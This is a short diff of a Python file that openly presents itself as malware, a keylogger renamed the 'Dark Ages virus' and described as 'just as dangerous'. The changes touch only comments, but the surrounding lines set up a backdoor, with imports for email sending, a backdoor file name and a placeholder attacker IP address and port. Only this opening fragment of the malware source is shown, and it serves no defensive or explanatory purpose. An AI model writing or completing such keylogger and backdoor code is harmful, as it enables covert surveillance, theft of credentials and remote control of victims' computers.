@@ -1,7 +1,6 @@
 Dark Ages:
 
-# Keylogger Virus
-
+# This is the Dark Ages virus. To the namesake of the destructive virus from Bill Clinton and James Patternson's novel, The President is Missing. It is just as dangerous :)
 import os
 import random
 import smtplib
@@ -11,7 +10,7 @@ import time
 import getpass
 import subprocess
 
-# Create persistent backdoor
+# Create backdoor
 BACKDOOR_FILE = "backdoor.py"
 IP_ADDRESS = '192.168.1.8' # [CHANGE TO ATTACKER'S IP ADDRESS]
 PORT = 6666
